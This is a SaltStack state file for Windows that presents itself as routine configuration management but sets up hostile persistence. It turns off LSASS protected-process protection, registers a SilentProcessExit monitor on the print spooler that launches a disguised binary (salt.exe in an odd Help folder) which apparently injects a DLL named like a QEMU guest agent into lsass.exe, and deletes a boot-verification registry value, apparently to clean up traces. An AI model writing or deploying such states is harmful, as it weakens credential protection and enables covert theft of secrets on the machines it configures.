disable_lsass_ppl:
  reg.present:
    - name: HKLM\SYSTEM\CurrentControlSet\Control\Lsa
    - vname: RunAsPPL
    - vdata: 0
    - vtype: REG_DWORD

silent_process_exit_reporting:
  reg.present:
    - name: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\spoolsv.exe
    - vname: ReportingMode
    - vdata: 1
    - vtype: REG_DWORD
    - require:
      - reg: disable_lsass_ppl

silent_process_exit_monitor:
  reg.present:
    - name: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\spoolsv.exe
    - vname: MonitorProcess
    - vdata: C:\Windows\Help\OEM\IndexStore\salt.exe -n lsass.exe -i C:\ProgramData\qemu-ga\qemu-ga.dll
    - vtype: REG_SZ
    - require:
      - reg: silent_process_exit_reporting

cleanup_boot_verification_imagepath:
  cmd.run:
    - name: reg delete "HKLM\SYSTEM\CurrentControlSet\Control\BootVerificationProgram" /v ImagePath /f
    - onlyif: reg query "HKLM\SYSTEM\CurrentControlSet\Control\BootVerificationProgram" /v ImagePath
